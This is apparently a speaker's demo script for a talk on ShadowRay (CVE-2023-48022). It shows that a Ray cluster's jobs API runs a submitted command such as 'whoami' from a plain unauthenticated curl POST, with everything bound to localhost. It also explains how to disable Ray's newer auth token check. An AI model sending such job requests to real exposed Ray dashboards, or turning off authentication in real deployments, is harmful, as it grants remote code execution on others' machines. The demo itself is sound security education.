# Demo 3: Ray with no login (ShadowRay, CVE-2023-48022)

**Before the talk (once):**
```
python3.12 -m venv .venv && .venv/bin/pip install "ray[default]==2.49.2"
```
Intel Mac: 2.49.2 is the newest Ray you can get. Apple Silicon / Linux: use `2.60.0`.

**On stage:**
```
source .venv/bin/activate

ray start --head --node-ip-address 127.0.0.1 --dashboard-host 127.0.0.1 --disable-usage-stats

ray job submit --address http://127.0.0.1:8265 -- whoami
# last lines:  warmearthling
#              Job 'raysubmit_...' succeeded

# No Ray client. No password. Just a web request:
curl -X POST http://127.0.0.1:8265/api/jobs/ -H 'Content-Type: application/json' -d '{"entrypoint": "whoami"}'
# {"job_id": "raysubmit_vF9M4Fz5KUGbAMv8", ...}

curl http://127.0.0.1:8265/api/jobs/raysubmit_vF9M4Fz5KUGbAMv8/logs     # use your job id
# {"logs": "... warmearthling\n"}

ray stop
```
`127.0.0.1` twice = nothing is reachable from the Wi-Fi.

If you have `~/.ray/auth_token`, Ray 2.52+ refuses the job. Start Ray with `RAY_AUTH_MODE=disabled` in front.
